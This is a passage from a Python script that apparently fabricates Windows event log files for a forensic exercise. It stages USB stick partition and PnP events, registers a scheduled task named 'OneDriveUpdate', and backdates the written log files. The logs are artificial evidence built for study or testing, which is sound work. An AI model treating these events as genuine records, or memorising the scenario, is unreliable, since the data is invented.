        ("Location", STRING, "Port_#0002.Hub_#0001" if on else ""), ("ParentId", STRING, USB_PARENT if on else ""),
        ("Socket", INT32, -1), ("Slot", INT32, -1), ("Bus", INT32, -1), ("Device", INT32, -1), ("Function", INT32, -1),
        ("Adapter", INT32, -1), ("Port", INT32, -1), ("Target", INT32, 0), ("Lun", INT32, 0),
        ("IoctlSupport", UINT32, 59903 if on else 0), ("IdFlags", UINT32, 4 if on else 0),
        ("DiskId", GUID, g("diskid")), ("AdapterId", GUID, g("adapterid") if on else "00000000-0000-0000-0000-000000000000"),
        ("RegistryId", GUID, g("registryid")), ("PoolId", GUID, "00000000-0000-0000-0000-000000000000"),
        ("FirmwareSupportsUpgrade", BOOL, False), ("FirmwareSlotCount", UINT32, 0), ("StorageIdCount", UINT32, 0),
        ("StorageIdCodeSet", UINT32, 0), ("StorageIdType", UINT32, 0), ("StorageIdAssociation", UINT32, 0),
        ("StorageIdBytes", UINT32, 0), ("StorageId", BINARY, b""), ("WriteCacheType", UINT32, 1 if on else 0),
        ("WriteCacheEnabled", UINT32, 1 if on else 0), ("WriteCacheChangeable", UINT32, 1 if on else 0),
        ("WriteThroughSupported", UINT32, 1 if on else 0), ("FlushCacheSupported", BOOL, on),
        ("IsPowerProtected", BOOL, False), ("NVCacheEnabled", BOOL, False),
        ("BytesPerLogicalSector", UINT32, 512 if on else 0), ("BytesPerPhysicalSector", UINT32, 512 if on else 0),
        ("BytesOffsetForSectorAlignment", UINT32, 0), ("IncursSeekPenalty", BOOL, on),
        ("IsTrimSupported", BOOL, False), ("IsThinProvisioned", BOOL, False), ("OptimalUnmapGranularity", UINT32, 0),
        ("UnmapAlignment", UINT32, 0), ("NumberOfLogicalCopies", UINT32, 0), ("NumberOfPhysicalCopies", UINT32, 0),
        ("FaultTolerance", UINT32, 0), ("NumberOfColumns", UINT32, 0), ("InterleaveBytes", UINT32, 0),
        ("HybridSupported", BOOL, False), ("HybridCacheBytes", UINT64, 0),
        ("AdapterMaximumTransferBytes", UINT32, 65536 if on else 0),
        ("AdapterMaximumTransferPages", UINT32, 17 if on else 0), ("AdapterAlignmentMask", UINT32, 0),
        ("AdapterSerialNumber", STRING, "NULL" if on else ""), ("PortDriver", UINT32, 3 if on else 0),
        ("UserRemovalPolicy", BOOL, on), ("PartitionStyle", UINT32, 0), ("PartitionCount", UINT32, 1 if on else 0),
        ("PartitionTableBytes", UINT32, 0), ("PartitionTable", BINARY, b""),
        ("MbrBytes", UINT32, 512 if on else 0), ("Mbr", BINARY, mbr() if on else b""),
        ("Vbr0Bytes", UINT32, 512 if on else 0), ("Vbr0", BINARY, ntfs_vbr() if on else b""),
        ("Vbr1Bytes", UINT32, 0), ("Vbr1", BINARY, b""), ("Vbr2Bytes", UINT32, 0), ("Vbr2", BINARY, b""),
        ("Vbr3Size", UINT32, 0), ("Vbr3", BINARY, b"")]
    return Event(when, "Microsoft-Windows-Partition", 1006, fields, version=4, keywords=0x8000000000000000,
                 pid=4, tid=412, user="S-1-5-18")


def pnp_event():
    return Event("2026-09-29 01:31:03.4027719", "Microsoft-Windows-Kernel-PnP", 400, [
        ("DeviceInstanceId", STRING, f"USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP\\{USB_SERIAL}&0"),
        ("DriverName", STRING, "disk.inf"), ("ClassGuid", STRING, "4d36e967-e325-11ce-bfc1-08002be10318"),
        ("DriverDate", STRING, "06/21/2006"), ("DriverVersion", STRING, "10.0.26100.1"),
        ("DriverProvider", STRING, "Microsoft"), ("DriverInbox", BOOL, True), ("DriverSection", STRING, "disk_install.NT"),
        ("DriverRank", STRING, "0xFF0006"), ("MatchingDeviceId", STRING, "GenDisk"), ("OutrankedDrivers", STRING, ""),
        ("DeviceUpdated", BOOL, False), ("Status", STRING, "0x0"), ("ParentDeviceInstanceId", STRING, USB_PARENT)],
        keywords=0x4000000500000000, pid=4, tid=4568, user="S-1-5-18")


def task_event():
    return Event("2026-09-29 01:21:05.4425108", "Microsoft-Windows-TaskScheduler", 106, [
        ("TaskName", STRING, "\\OneDriveUpdate"), ("UserContext", STRING, "WS-ALICE\\alice")],
        task=106, keywords=0x8000000000000000, pid=1540, tid=7712, user="S-1-5-18", data_attr="TaskRegisteredEvent")


LOGS = [   # (file name, events, first record ID)
    ("Security.evtx", security_log, 18234),
    ("System.evtx", system_log, 4120),
    ("Microsoft-Windows-PowerShell%4Operational.evtx", powershell_log, 902),
    ("Microsoft-Windows-TaskScheduler%4Operational.evtx", lambda: [task_event()], 311),
    ("Microsoft-Windows-Partition%4Diagnostic.evtx",
     lambda: [partition_event("2026-09-29 01:31:02.8810362", True),
              partition_event("2026-09-29 01:36:40.1146530", False)], 57),
    ("Microsoft-Windows-Kernel-PnP%4Configuration.evtx", lambda: [pnp_event()], 1288),
]


def main(outdir):
    logs = os.path.join(outdir, "Windows", "System32", "winevt", "Logs")
    os.makedirs(logs, exist_ok=True)
    for name, events, first in LOGS:
        p = os.path.join(logs, name)
        evs = events()
        write_evtx(p, evs, first)
        when = max(e.when for e in evs)
        t = (ft(when) - 116444736000000000) / 10_000_000
        os.utime(p, (t, t))
        print(f"{os.path.getsize(p):7d}  {len(evs):3d} events  {name}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    main(sys.argv[1])
